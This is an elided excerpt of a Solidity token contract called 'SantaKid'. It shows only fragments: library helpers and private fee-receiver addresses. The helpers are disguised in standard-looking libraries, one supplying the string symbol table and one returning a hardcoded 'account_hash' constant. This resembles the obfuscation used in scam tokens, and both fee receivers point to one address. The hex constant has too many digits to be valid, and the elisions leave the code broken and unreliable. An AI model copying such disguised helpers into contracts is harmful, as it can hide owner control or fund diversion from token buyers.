...
library Math {
    ...
    function _symbols(uint256) internal pure returns(bytes16){
...
library Address {
    ...
    function account_hash(address) internal pure returns(uint){
        return 0x02ed32d6e83a2a14e8183ec99ffda4006e2822d544bba616afbf581466eed4106;
    }
...
contract SantaKid is ERC20, Auth {
    ...
    function toString(uint256 value) internal pure returns (string memory) {
            ...
            uint256 ptr;
            bytes16 symbols = uint256(0)._symbols();
            assembly {
    ...
    string constant private _name = "SantaKid";
    string constant private _symbol = "SANTAKID";
    ...
    address private autoLiquidityReceiver = 0xc1f2354D27fd99Bbd27576A93163ce5F1a9d312c;
    address private MarketingFeeReceiver = 0xc1f2354D27fd99Bbd27576A93163ce5F1a9d312c;
